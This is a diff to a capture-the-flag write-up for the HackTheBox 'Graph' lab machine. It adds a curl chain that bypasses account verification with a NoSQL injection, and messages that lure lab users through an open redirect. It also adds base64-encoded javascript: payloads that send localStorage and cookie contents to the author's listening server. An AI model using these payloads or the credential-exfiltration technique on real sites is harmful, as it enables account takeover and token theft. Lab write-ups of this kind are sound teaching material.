@@ -79,7 +79,7 @@ gobuster vhost -u http://10.10.11.157 --domain graph.htb --append-domain -w /usr
 
 ### Web browsing
 
-On port 80, the frontpage is empty but its scripts point:
+On port 80, the frontpage is empty but it implements an open redirect:
 
 ```javascript
 if(param[0] === "?redirect"){
@@ -385,6 +385,26 @@ Which steps through the whole registration process. So the next step is to query
 {"result":"Account Created Please Login!"}
 ```
 
+The whole process is easily scripted:
+
+```shell
+curl -i -s -k -X $'POST' \
+    -H $'Host: internal-api.graph.htb' \
+    -H $'Content-Type: application/json' \
+    --data-binary $'{\"email\":\"apehex@graph.htb\"}' \
+    $'http://internal-api.graph.htb/api/code' \
+    --next -i -s -k -X $'POST' \
+    -H $'Host: internal-api.graph.htb' \
+    -H $'Content-Type: application/json' \
+    --data-binary $'{\"email\":\"apehex@graph.htb\",\"code\":{\"$ne\":\"1234\"}}' \
+    $'http://internal-api.graph.htb/api/verify' \
+    --next -i -s -k -X $'POST' \
+    -H $'Host: internal-api.graph.htb' \
+    -H $'Content-Type: application/json' \
+    --data-binary $'{\"email\":\"apehex@graph.htb\",\"password\":\"heyhey\",\"confirmPassword\":\"heyhey\",\"username\":\"apehex\"}' \
+    $'http://internal-api.graph.htb/api/register'
+```
+
 ## Exploring the dashboard
 
 Upon connection a JWT cookie appears:
@@ -447,7 +467,7 @@ But uploading requires an `adminToken`:
 
 ## User shell
 
-Since we can message "Mark",
+Since we can message "Mark", there may be a way to gain his token.
 
 ```json
 "message":"Cannot read property 'username' of null"
@@ -459,25 +479,49 @@ Let's update the profile and add "username", "lastname" etc:
 {"operationName":"update","variables":{"firstname":"ape","lastname":"hex","id":"628b5134f4981e04372005d5","newusername":"apehex"},"query":"mutation update($newusername: String!, $id: ID!, $firstname: String!, $lastname: String!) {\n  update(\n    newusername: $newusername\n    id: $id\n    firstname: $firstname\n    lastname: $lastname\n  ) {\n    username\n    email\n    id\n    firstname\n    lastname\n    __typename\n  }\n}"}
 ```
 
-Poke Larry / Mark / James:
+Poke Larry / Mark / James with a link to our server:
 
 ```json
-{"variables":{"to":"larry@graph.htb","text":"yo Larry!\n<img src=\"http://graph.htb/?redirect=http://10.10.16.2:9999/yo.png\">"},"query":"mutation ($to: String!, $text: String!) {\n  sendMessage(to: $to, text: $text) {\n    toUserName\n    fromUserName\n    text\n    to\n    from\n    __typename\n  }\n}"}
+{"variables":{"to":"larry@graph.htb","text":"yo Larry!\n<img src=\"http://graph.htb/?redirect=http://10.10.16.4:8888/unlock.html\">"},"query":"mutation ($to: String!, $text: String!) {\n  sendMessage(to: $to, text: $text) {\n    toUserName\n    fromUserName\n    text\n    to\n    from\n    __typename\n  }\n}"}
 ```
 
-It works!
+Which they actually follow:
 
 ```
-GET /yo.png%22%3E HTTP/1.1
+Ncat: Connection from 10.10.11.157:51338.
+/GET /?%7B%7D HTTP/1.1
 Host: 10.10.16.2:9999
-Connection: keep-alive
-Upgrade-Insecure-Requests: 1
-User-Agent: Chrome/77
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Referer: http://graph.htb/
-Accept-Encoding: gzip, deflate
-Accept-Language: en-US
 ```
+
+But the page is opened from a context where the local storage is empty: `%7B%7D` is `{}`.
+
+Next, let's try and inject JS directly into the redirect argument:
+
+```
+http://graph.htb/?redirect=javascript:alert(1)
+```
+
+And base64 encode the successive payloads:
+
+```javascript
+javascript:alert(atob("YWxlcnQoMSk"))
+javascript:alert(atob("YWxlcnQoMSk"))
+javascript:alert(atob("ZmV0Y2goImh0dHA6Ly8xMC4xMC4xNi40Ojk5OTkvP3N0b3JhZ2U9Iik"))
+javascript:alert(atob("ZmV0Y2goImh0dHA6Ly8xMC4xMC4xNi40Ojk5OTkvP3N0b3JhZ2U9IitidG9hKEpTT04uc3RyaW5naWZ5KGxvY2FsU3RvcmFnZSkpKQ"))
+javascript:alert(atob("ZG9jdW1lbnQubG9jYXRpb24uaHJlZj0iaHR0cDovL2ludGVybmFsLmdyYXBoLmh0YiI7ZmV0Y2goImh0dHA6Ly8xMC4xMC4xNi40Ojk5OTkvP3N0b3JhZ2U9IitidG9hKEpTT04uc3RyaW5naWZ5KGRvY3VtZW50LmNvb2tpZSkpKQ"))
+```
+
+```shell
+echo -n 'document.location.href="http://internal.graph.htb/inbox";await new Promise(r=>setTimeout(r,2000));fetch("http://10.10.16.4:9999/?storage="+btoa(JSON.stringify(localStorage)))' | base64 -w 0
+```
+
+```
+http://graph.htb/?redirect=javascript:eval(atob(%22ZmV0Y2goImh0dHA6Ly8xMC4xMC4xNi40Ojk5OTkvP3N0b3JhZ2U9IitidG9hKEpTT04uc3RyaW5naWZ5KGxvY2FsU3RvcmFnZSkpKQ%22))
+http://graph.htb/?redirect=javascript:eval(atob("ZG9jdW1lbnQubG9jYXRpb24uaHJlZj0iaHR0cDovL2ludGVybmFsLmdyYXBoLmh0YiI7ZmV0Y2goImh0dHA6Ly8xMC4xMC4xNi40Ojk5OTkvP3N0b3JhZ2U9IitidG9hKEpTT04uc3RyaW5naWZ5KGxvY2FsU3RvcmFnZSkpKQ"))
+http://graph.htb/?redirect=javascript:eval(atob("ZG9jdW1lbnQubG9jYXRpb24uaHJlZj0iaHR0cDovL2ludGVybmFsLmdyYXBoLmh0Yi9pbmJveCI7YXdhaXQgbmV3IFByb21pc2Uocj0+c2V0VGltZW91dChyLDIwMDApKTtmZXRjaCgiaHR0cDovLzEwLjEwLjE2LjQ6OTk5OS8/c3RvcmFnZT0iK2J0b2EoSlNPTi5zdHJpbmdpZnkobG9jYWxTdG9yYWdlKSkp"))
+```
+
+The HTML tag is not interpreted since the requested path contains `%22%3E`, which is `">`.
 
 And finally exfiltrate an "adminToken":
 
